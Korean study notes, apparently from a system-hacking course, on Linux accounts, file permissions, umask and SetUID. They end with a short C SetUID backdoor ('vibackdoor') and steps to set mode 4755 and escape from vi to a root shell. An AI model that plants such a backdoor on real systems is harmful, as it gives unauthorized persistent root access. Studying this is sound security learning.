# 1. 리눅스의 계정과 권한
- 로그인
	username과 password로 **인증**을 하고, 그에 따른 **인가**를 받아서 시스템에 접근할 수 있도록 허가를 받는 과정.
- 시스템 해킹
	일반 사용자 권한 이상의 권한을 획득하는 절차
- 리눅스의 계정과 권한 종류 -> root라는 관리자 or 일반 사용자 계정
## 1.1 `/etc/passwd` 파일
- 계정 목록이 저장된 파일
![[Pasted image 20251014230904.png|500]]
1. 사용자 계정
2. 패스워드를 암호화해 `/etc/shadow` 파일에 저장했음을 나타냄
3. UID
4. GID
5. 사용자 이름, can be anything
6. 사용자 홈 디렉터리, root -> `/root` or 일반 사용자 -> `/home` 하위
7. 사용자 셸, default bash
## 1.2 ls -al 명령어 형식
![[Pasted image 20251014231555.png|400]]
1. 파일 속성 및 권한 표기
2. 해당 파일에 링크된 파일의 수
3. 파일 생성자 계정
4. 생성자 계정 그룹
### 1.2.1 파일 속성

| 문자  | 파일 속성             |
| --- | ----------------- |
| d   | 디렉터리 파일           |
| -   | 일반 정규 파일          |
| l   | 링크된 파일            |
| c   | 버퍼에 저장되지 않은 특수 파일 |
| b   | 버퍼링된 특수 파일        |
| s   | 소켓 파일             |
| p   | 파이프 파일            |

### 1.2.2 파일 권한
- 파일 소유자, 그룹, Others 별로 권한이 나뉨. ex) 위 이미지에선 rwx, r-x, r-x로 나뉨.
- r: 4(binary 100)
- w: 2(binary 10)
- x: 1(binary 1)
## 1.3 Default 권한
- **umask** 값에 의해 결정됨. `/etc/profile`, `.profile` 파일 등에서 설정됨.
	- by default, root -> `022`
	- user -> 002
	- root만 수정 가능
- Maximum default 권한은 **파일 -> 666** or **디렉터리 -> 777**
- umask를 빼면 -> 644, 755
## 1.4 파일 권한 수정
- `chmod 777 c.txt` 생성된 파일의 권한 수정
- `chown root c.txt` & `chgrp root c.txt` 파일의 소유자와 그룹 수정
# 2. SetUID
- 실행파일에 붙일 수 있는 특수 권한. 해당 권한이 있는 파일을 실행하면 프로세스의 EUID가 해당 파일 소유자의 UID로 바뀜.
- -> setuid를 사용해서 합법적인 권한 상승을 할 수 있다. 
- RUID, RGID, real...
- EUID EGID, effective...
- 일반적으로 처음 로그인 시, RUID <> EUID RGID <> EGID는 동일.
- 그러나 SetUID 비트가 설정된 프로그램 실행 시 불일치.
## 2.1 `/etc/shadow`
- 암호화된 password는 `/etc/shadow`에 저장됨.
- `/etc/shadow` 권한 -> `000` 따라서 root도 읽기 권한이 없지만, 소유자가 root라서 수정 및 접근은 가능.
- `passwd` 명령 실행 시 -> RUID 500, EUID 0
- `passwd` 명령 종료 시 -> RUID 500, EUID 500
	-> 이것이 SetUID 효과
## 2.2 파일 권한
- `passwd` 명령은 `rws r-x r-x` 권한. 여기서 s가 SetUID를 가리킴.
- SetUID 4000, SetGID 2000
## 2.3 기타
- `find / -user root -perm +4000`: 파일 소유자가 root with SetUID인 파일을 찾는 명령어
# 3. SetUID 백도어
```c
// vibackdoor.
#include <stdio.h>
main() {
	setuid(0);
	setgid(0);
	system("/bin/vi");
}
```
1. 위와 같은 파일을 컴파일 후 `chmod 4755 vibackdoor`로 SetUID 설정.
2. 그리고 파일 실행 후 < esc > `:!/bin/bash` 실행.
- 일반 유저 계정의 셸에서 root 소유의 vi editor 실행. -> SetUID를 통해 EUID(0) -> `setuid(0); setgid(0);` 
- -> root 권한을 가진 셸 획득